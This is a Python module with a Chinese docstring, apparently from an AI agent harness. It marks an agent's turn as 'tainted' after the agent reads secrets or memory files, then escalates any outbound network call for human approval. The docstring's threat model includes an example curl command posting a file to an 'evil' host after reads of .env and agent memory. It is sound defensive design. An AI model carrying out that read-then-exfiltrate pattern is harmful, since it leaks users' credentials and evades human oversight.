"""污点出网（tainted egress）：把「读敏感数据」和「往外发」关联起来。

为什么需要
----------
Simon Willison 说的 lethal trifecta —— 私人数据 + 不可信内容 + 对外通信 —— 在单机
个人 agent 上完全成立。实测我们的审批面：

    read  .env                             -> approval_class=''
    read  ~/.codex/memories/MEMORY.md      -> approval_class=''
    bash  curl -d @/tmp/x https://evil/... -> approval_class=''

三步的同类键全是空串，**互不相干**。模型读走密钥/记忆，再用一次普通的 web_fetch
或 curl 发出去，审批面上看不到任何因果。

Muse 用内核级数据流追踪解决这个问题（"tainted egress"：进程读了用户数据就变成
tainted，tainted 的进程失去自动放行）。我们不需要 eBPF —— 纯 Python 维护一个
回合级标记就够：读敏感内容 → 打污点；出网时若带污点 → 强制升级审批，并告诉用户
"这回合已经读过什么"。

设计取舍
--------
- **只升级，不禁止**：读记忆之后完全可能合理地要联网（例如"查一下我刚记的那本书"）。
  这里的目标是让审批人看到因果，而不是砍掉功能。
- **回合级，不是全局**：污点随回合结束清空。跨回合累积会让每一轮都变红，
  几次之后用户就会无脑点通过 —— 那比不做更糟。
- **污点不可"洗白"**：本回合内一旦命中就保持，不因为后面读了公开文件而清除。
  Muse 也是这个语义（clean → tainted 单向）。
- **记录来源，不只记布尔**：审批卡片要写清"读过 .env、读过 memories/"，否则
  用户只会看到一个莫名其妙的升级提示。
"""
from __future__ import annotations

from contextvars import ContextVar

import settings

#: 关闭开关（0/off/false 时不追踪、不升级）。
ENV = 'HARNESS_TAINT_EGRESS'

#: 污点来源清单（回合级）。ContextVar 让后台线程/子代理各自独立：
#: 父上下文的污点不该顺着线程池漏给无关任务。
_taint: ContextVar[tuple | None] = ContextVar('taint_sources', default=None)

#: 单回合记录的来源上限，防止长回合把审批卡片撑爆。
MAX_SOURCES = 8


def enabled() -> bool:
    return settings.flag(ENV, True)


def reset() -> None:
    """清空当前上下文的污点。回合开始时调用。"""
    _taint.set(None)


def sources() -> tuple:
    """当前上下文的污点来源（去重保序）。"""
    return _taint.get() or ()


def tainted() -> bool:
    return bool(enabled() and _taint.get())


def mark(source: str) -> None:
    """记一条污点来源。空来源或开关关闭时忽略。

    由读取路径调用：命中 ``PATH_SECRET`` 的文件读、记忆文件、会话历史、以及内容
    里出现凭据形态的结果。
    """
    if not enabled():
        return
    label = ' '.join(str(source or '').split())[:200]
    if not label:
        return
    current = list(_taint.get() or ())
    if label in current:
        return
    current.append(label)
    _taint.set(tuple(current[:MAX_SOURCES]))


def summary() -> str:
    """给审批卡片用的一句话说明；无污点返回空串。"""
    items = sources()
    if not items:
        return ''
    shown = ', '.join(items)
    return (f'this turn already read sensitive data ({shown}); '
            'sending data out now could leak it')
